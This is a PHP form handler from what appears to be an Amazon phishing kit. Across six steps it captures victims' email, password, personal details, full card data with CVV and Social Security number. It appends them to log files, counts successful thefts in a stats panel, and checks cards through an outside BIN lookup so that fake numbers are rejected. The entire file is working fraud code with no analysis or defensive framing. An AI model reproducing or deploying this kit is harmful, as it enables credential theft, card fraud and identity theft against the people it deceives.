<?php
session_start();
ob_start();
include '../config.php';
if ($_SERVER['REQUEST_METHOD'] == 'POST') {

	function update_ini_file($data, $filepath)
	{
		$content = "";
		$parsed_ini = parse_ini_file($filepath, true);
		foreach ($data as $section => $values) {
			if ($section === "") {
				continue;
			}
			$content .= $section . "=" . $values . "\n\r";
		}
		if (!$handle = fopen($filepath, 'w')) {
			return false;
		}
		$success = fwrite($handle, $content);
		fclose($handle);
	}

	function save_to_file($message) {
		// Create the directory if it doesn't exist
		$directory = '../logins/';
		if (!is_dir($directory)) {
			mkdir($directory, 0777, true);
		}
	
		// Reuse the filename stored in session
		$filename = $directory . $_SESSION['log_filename'];
	
		// Append the message to the file
		file_put_contents($filename, $message, FILE_APPEND);
	}
	if (isset($_POST['step1'])) {

		if (empty($_POST['email'])) {
			header('location: ../Forbidden');
			exit();
		}

		$ip_address = $_SERVER['REMOTE_ADDR'];
		$_SESSION['email']  = $_POST['email'];
		if (!isset($_SESSION['log_filename'])) {
            $_SESSION['log_filename'] = 'log_' . md5($_SESSION['email'] . rand()) . '.txt';
        }
		$message = "[😊Amazon]\nUser: {$_POST['email']}\nIP: {$ip_address}\n\n";
		save_to_file($message);

		header('location: ../login/ap_signin?enc=' . md5(time()) . '&p=0&dispatch=' . sha1(time()));
		exit();
	}

	if (isset($_POST['step2'])) {

		if (empty($_SESSION['email'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_POST['password1'])) {
			header('location: ../Forbidden');
			exit();
		}

		$_SESSION['pass'] = $_POST['password1'];

		$message = "-| Amazon Logs 🛒\n-| User: {$_SESSION['email']}\n-| Pass: {$_POST['password1']}\nIP: {$_SERVER['REMOTE_ADDR']}\nUser Agent: {$_SERVER['HTTP_USER_AGENT']}\n\n";


		save_to_file($message);

		$filepath = '../panel/stats.ini';
		$data = @parse_ini_file($filepath);
		$data['logs']++;

		update_ini_file($data, $filepath);

		header('location: ../login/ap_billing?enc=' . md5(time()) . '&p=0&dispatch=' . sha1(time()));
		exit();
	}

	if (isset($_POST['step3'])) {

		if (empty($_SESSION['email'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_SESSION['pass'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_POST['name'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_POST['dob'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_POST['country-code'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_POST['address'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_POST['zip'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_POST['city'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_POST['phone'])) {
			header('location: ../Forbidden');
			exit();
		}

		$_SESSION["name"]    = $_POST["name"];
		$_SESSION["dob"] = $_POST["dob"];
		$_SESSION["pays"]   = $_POST["country-code"];
		$_SESSION["address"]   = $_POST["address"];
		$_SESSION["address2"]   = $_POST["address2"];
		$_SESSION["zip"]    = $_POST["zip"];
		$_SESSION["city"] = $_POST["city"];
		$_SESSION["phone"]   = $_POST["phone"];
		$message = "📁 Amazon Infos 📁\n-| User: {$_SESSION['email']}\n-| Pass: {$_SESSION['pass']}\n-| Name: {$_SESSION['name']}\n-| Date: {$_SESSION['dob']}\n-| Address: {$_SESSION['address']} {$_SESSION['address2']}\n-| City: {$_SESSION['city']}\n-| Zip: {$_SESSION['zip']}\n-| Phone: {$_SESSION['phone']}\n-| Pays: {$_SESSION['pays']}\nIP: {$_SERVER['REMOTE_ADDR']}\nUser Agent: {$_SERVER['HTTP_USER_AGENT']}\n\n";


		save_to_file($message);


		$filepath = '../panel/stats.ini';
		$data = @parse_ini_file($filepath);
		$data['billings']++;

		update_ini_file($data, $filepath);

		header('location: ../login/ap_card?enc=' . md5(time()) . '&p=0&dispatch=' . sha1(time()));
		exit();
	}

	if (isset($_POST['step4'])) {

		if (empty($_SESSION['email'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_SESSION['pass'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_SESSION['name'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_SESSION['dob'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_SESSION['pays'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_SESSION['address'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_SESSION['zip'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_SESSION['city'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_SESSION['phone'])) {
			header('location: ../Forbidden');
			exit();
		}

		if (empty($_POST["ccname"])) {
			header('location: ../login/ap_card?error=invalidcard');
			exit();
		}
		if (empty($_POST["cvv"])) {
			header('location: ../login/ap_card?error=invalidcard');
			exit();
		}
		if (empty($_POST["expirem"])) {
			header('location: ../login/ap_card?error=invalidcard');
			exit();
		}
		if (empty($_POST["expirey"])) {
			header('location: ../login/ap_card?error=invalidcard');
			exit();
		}
		if (empty($_POST["ccnum"])) {
			header('location: ../login/ap_card?error=invalidcard');
			exit();
		}


		$xcc = str_replace(' ', '', $_POST["ccnum"]);
		if (is_numeric($xcc)) {
			// good
		} else {
			header('location: ../login/ap_card?error=invalidcard');
			exit();
		}


$bincheck = $_POST['ccnum'];
$bincheck = preg_replace('/\s/', '', $bincheck);

$cardlastdigit = substr($_POST['ccnum'], 12, 16);
$_SESSION['cardlastdigit'] = $cardlastdigit;

$bin = $_POST['ccnum'];
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin, 0, 8);

$url = "https://data.handyapi.com/bin/" . $bin;
$headers = array();
$headers[] = 'Accept-Version: 3';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp = curl_exec($ch);
curl_close($ch);

$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = isset($xBIN["Issuer"]) ? $xBIN["Issuer"] : "UNKNOWN";
$_SESSION['bank_scheme'] = isset($xBIN["Scheme"]) ? strtoupper($xBIN["Scheme"]) : "UNKNOWN";
$_SESSION['bank_type'] = isset($xBIN["Type"]) ? strtoupper($xBIN["Type"]) : "UNKNOWN";
$_SESSION['bank_brand'] = isset($xBIN["CardTier"]) ? strtoupper($xBIN["CardTier"]) : "UNKNOWN";
$_SESSION['bank_country'] = isset($xBIN["Country"]["Name"]) ? $xBIN["Country"]["Name"] : "UNKNOWN";

if ($_SESSION['bank_scheme'] === "UNKNOWN" || $_SESSION['bank_name'] === "UNKNOWN") {
    header("Location: ../login/ap_card?error=invalidcard");
    exit("Invalid data");
}

$_SESSION["ccname"] = $_POST["ccname"];
$_SESSION["ccnum"] = str_replace(' ', '', $_POST["ccnum"]);
$_SESSION["cvv"] = $_POST["cvv"];
$_SESSION["expirem"] = $_POST["expirem"];
$_SESSION["expirey"] = $_POST["expirey"];
$message = "🔥 Amazon Card 🔥\n-| Holder: " . $_POST["ccname"] . "\n-| CC: " . $_POST["ccnum"] . "\n-| Exp: " . $_POST["expirem"] . "/" . $_POST["expirey"] . "\n-| Cvv: " . $_POST["cvv"] . "\n💳 Additional Card Info 💳\n-| Bank Name: " . $_SESSION['bank_name'] . "\n-| Card Scheme: " . $_SESSION['bank_scheme'] . "\n-| Card Type: " . $_SESSION['bank_type'] . "\n-| Card Brand: " . $_SESSION['bank_brand'] . "\n-| Country: " . $_SESSION['bank_country'] . "\n📁 Amazon CC 📁\n-| Name: " . $_SESSION["name"] . "\n-| Date: " . $_SESSION["dob"] . "\n-| Address: " . $_SESSION["address"] . " " . $_SESSION["address2"] . "\n-| City: " . $_SESSION["city"] . "\n-| Zip: " . $_SESSION["zip"] . "\n-| Phone: " . $_SESSION["phone"] . "\n-| Pays: " . $_SESSION["pays"] . "\n🛒 Amazon Logs 🛒\n-| User: " . $_SESSION['email'] . "\n-| Pass: " . $_SESSION['pass'] . "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\nUser-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n🥂\n\n";


		save_to_file($message);


		$filepath = '../panel/stats.ini';
		$data = @parse_ini_file($filepath);
		$data['cc']++;

		update_ini_file($data, $filepath);

		if ($apple_pay == "yes") {
			header('location: ../login/ap_loading_vbv?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));
			exit();
		} else {
			header('location: ../login/ap_finish?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));
			exit();
		}

		header('location: ../login/ap_billing?enc=' . md5(time()) . '&p=0&dispatch=' . sha1(time()));
		exit();
	}

	if (isset($_POST['step5'])) {

		if (empty($_SESSION['email'])) {
			header('location: ../Forbidden1');
			exit();
		}
		if (empty($_SESSION['pass'])) {
			header('location: ../Forbidden2');
			exit();
		}
		if (empty($_SESSION['name'])) {
			header('location: ../Forbidden3');
			exit();
		}
		if (empty($_SESSION['dob'])) {
			header('location: ../Forbidden3');
			exit();
		}
		if (empty($_SESSION['pays'])) {
			header('location: ../Forbidden4');
			exit();
		}
		if (empty($_SESSION['address'])) {
			header('location: ../Forbidden5');
			exit();
		}
		if (empty($_SESSION['zip'])) {
			header('location: ../Forbidden6');
			exit();
		}
		if (empty($_SESSION['city'])) {
			header('location: ../Forbidden7');
			exit();
		}
		if (empty($_SESSION['phone'])) {
			header('location: ../Forbidden8');
			exit();
		}

		if (empty($_SESSION["ccname"])) {
			header('location: ../Forbidden9');
			exit();
		}
		if (empty($_SESSION["cvv"])) {
			header('location: ../Forbidden10');
			exit();
		}
		if (empty($_SESSION["expirem"])) {
			header('location: ../Forbidden11');
			exit();
		}
		if (empty($_SESSION["expirey"])) {
			header('location: ../Forbidden12');
			exit();
		}
		if (empty($_POST["SSN"])) {
			header('location: ../Forbidden13');
			exit();
		}


		$_SESSION['SSN']  = $_POST['SSN'];

		$message = "🔥 Amazon Card 🔥\n-| Holder: " . $_POST["ccname"] . "\n-| CC: " . $_POST["ccnum"] . "\n-| Exp: " . $_POST["expirem"] . "/" . $_POST["expirey"] . "\n-| Cvv: " . $_POST["cvv"] . "\n-| SSN: " . $_POST["SSN"] . "\n\n💳 Additional Card Info 💳\n-| Bank Name: " . $_SESSION['bank_name'] . "\n-| Card Scheme: " . $_SESSION['bank_scheme'] . "\n-| Card Type: " . $_SESSION['bank_type'] . "\n-| Card Brand: " . $_SESSION['bank_brand'] . "\n-| Country: " . $_SESSION['bank_country'] . "\n\n📁 Amazon CC 📁\n-| Name: " . $_SESSION["name"] . "\n-| Date of Birth: " . $_SESSION["dob"] . "\n-| Address: " . $_SESSION["address"] . " " . $_SESSION["address2"] . "\n-| City: " . $_SESSION["city"] . "\n-| Zip: " . $_SESSION["zip"] . "\n-| Phone: " . $_SESSION["phone"] . "\n-| Country: " . $_SESSION["pays"] . "\n\n🛒 Amazon Logs 🛒\n-| User: " . $_SESSION['email'] . "\n-| Pass: " . $_SESSION['pass'] . "\n\nIP: " . $_SERVER['REMOTE_ADDR'] . "\nUser-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n🥂\n\n";

		save_to_file($message);

		header('location: ../login/ap_loading_vbv?v2&enc=' . md5(time()) . '&p=0&dispatch=' . sha1(time()));

		// header('location: ../login/ap_apple_pay?v2&enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
		exit();
	}

	if (isset($_POST['step6'])) {

		if (empty($_SESSION['email'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_SESSION['pass'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_SESSION['name'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_SESSION['dob'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_SESSION['pays'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_SESSION['address'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_SESSION['zip'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_SESSION['city'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_SESSION['phone'])) {
			header('location: ../Forbidden');
			exit();
		}

		if (empty($_SESSION["ccname"])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_SESSION["cvv"])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_SESSION["expirem"])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_SESSION["expirey"])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_POST["SSN"])) {
			header('location: ../Forbidden');
			exit();
		}


		$_SESSION['SSN'] = $_POST['SSN'];
		$message = "🔥 Amazon Card 🔥\n-| Holder: " . $_POST["ccname"] . "\n-| CC: " . $_POST["ccnum"] . "\n-| Exp: " . $_POST["expirem"] . "/" . $_POST["expirey"] . "\n-| Cvv: " . $_POST["cvv"] . "\n-| SSN: " . $_POST["SSN"] . "\n\n💳 Additional Card Info 💳\n-| Bank Name: " . $_SESSION['bank_name'] . "\n-| Card Scheme: " . $_SESSION['bank_scheme'] . "\n-| Card Type: " . $_SESSION['bank_type'] . "\n-| Card Brand: " . $_SESSION['bank_brand'] . "\n-| Country: " . $_SESSION['bank_country'] . "\n\n📁 Amazon CC 📁\n-| Name: " . $_SESSION["name"] . "\n-| Date of Birth: " . $_SESSION["dob"] . "\n-| Address: " . $_SESSION["address"] . " " . $_SESSION["address2"] . "\n-| City: " . $_SESSION["city"] . "\n-| Zip: " . $_SESSION["zip"] . "\n-| Phone: " . $_SESSION["phone"] . "\n-| Country: " . $_SESSION["pays"] . "\n\n🛒 Amazon Logs 🛒\n-| User: " . $_SESSION['email'] . "\n-| Pass: " . $_SESSION['pass'] . "\n\nIP: " . $_SERVER['REMOTE_ADDR'] . "\nUser-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n🥂";

		save_to_file($message);

		unset($_SESSION['log_filename']); 
		header('location: ../login/ap_finish?enc=' . md5(time()) . '&p=0&dispatch=' . sha1(time()));
		exit();
	}

	header('location: ../Forbidden');
} else {
	header('location: ../Forbidden');
}

